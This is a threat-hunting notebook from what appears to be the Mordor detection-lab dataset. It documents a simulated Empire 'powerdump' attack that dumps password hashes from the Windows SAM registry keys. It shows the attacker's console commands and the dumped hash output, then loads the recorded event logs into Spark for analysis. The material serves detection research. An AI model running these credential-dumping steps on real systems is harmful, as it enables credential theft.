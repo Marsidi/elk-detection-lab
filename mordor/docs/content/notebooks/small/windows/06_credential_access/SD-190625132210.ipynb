{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Empire Powerdump"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| id                | SD-190625132210 |\n",
    "| author            | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| creation date     | 2019/06/25 |\n",
    "| platform          | Windows |\n",
    "| Mordor Environment| shire |\n",
    "| Simulation Type   | C2 |\n",
    "| Simulation Tool   | Empire |\n",
    "| Simulation Script | https://github.com/hunters-forge/Blacksmith/blob/master/aws/mordor/cfn-files/scripts/Invoke-Mimikatz.ps1 |\n",
    "| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/empire_powerdump.tar.gz |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries dumping hashes from HKLM:\\SAM\\SAM\\Domains\\ registry keys."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: Y298VW3B) > usemodule credentials/powerdump*\n",
    "(Empire: powershell/credentials/powerdump) > info\n",
    "\n",
    "              Name: Invoke-PowerDump\n",
    "            Module: powershell/credentials/powerdump\n",
    "        NeedsAdmin: True\n",
    "        OpsecSafe: True\n",
    "          Language: powershell\n",
    "MinLanguageVersion: 2\n",
    "        Background: True\n",
    "  OutputExtension: None\n",
    "\n",
    "Authors:\n",
    "  DarkOperator\n",
    "  winfang\n",
    "  Kathy Peters\n",
    "  ReL1K\n",
    "\n",
    "Description:\n",
    "  Dumps hashes from the local system using Posh-SecMod's\n",
    "  Invoke-PowerDump\n",
    "\n",
    "Comments:\n",
    "  https://github.com/darkoperator/Posh-\n",
    "  SecMod/blob/master/PostExploitation/PostExploitation.psm1\n",
    "\n",
    "Options:\n",
    "\n",
    "  Name  Required    Value                     Description\n",
    "  ----  --------    -------                   -----------\n",
    "  Agent True        Y298VW3B                  Agent to run module on.                 \n",
    "\n",
    "(Empire: powershell/credentials/powerdump) > execute\n",
    "[*] Tasked Y298VW3B to run TASK_CMD_JOB\n",
    "[*] Agent Y298VW3B tasked with task ID 4\n",
    "[*] Tasked agent Y298VW3B to run module powershell/credentials/powerdump\n",
    "(Empire: powershell/credentials/powerdump) > Job started: NPFW52\n",
    "Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n",
    "\n",
    "\n",
    "Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n",
    "\n",
    "\n",
    "DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n",
    "\n",
    "\n",
    "WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n",
    "\n",
    "\n",
    "Nora:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n",
    "\n",
    "(Empire: powershell/credentials/powerdump) >\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/empire_powerdump.tar.gz\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "    '''\n",
    "SELECT channel, COUNT(1)\n",
    "FROM mordorTable\n",
    "GROUP BY channel\n",
    "    '''\n",
    ")\n",
    "df.show(10,False)\n",
    "        "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 4
}
